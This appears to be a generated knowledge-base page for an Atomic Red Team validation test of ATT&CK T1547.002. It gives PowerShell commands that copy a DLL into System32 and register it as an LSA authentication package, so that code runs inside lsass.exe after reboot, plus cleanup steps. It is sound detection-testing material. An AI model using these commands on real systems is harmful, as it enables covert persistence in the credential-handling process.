---
atomic_guid: "be2590e8-4ac3-47ac-b4b5-945820f2fbe9"
title: "Authentication Package"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.002"
attack_technique_name: "Authentication Package"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.002/T1547.002.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "be2590e8-4ac3-47ac-b4b5-945820f2fbe9"
  - "Authentication Package"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Establishes persistence using a custom authentication package for the Local Security Authority (LSA).
After a reboot, Notepad.exe will be executed as child process of lsass.exe.
Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package
[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution#^t1547002-authentication-package|T1547.002: Authentication Package]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Copy-Item "$PathToAtomicsFolder\T1547.002\bin\package.dll" C:\Windows\System32\
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f
```

### Cleanup

```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
rm -force C:\windows\system32\package.dll
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.002/T1547.002.yaml)
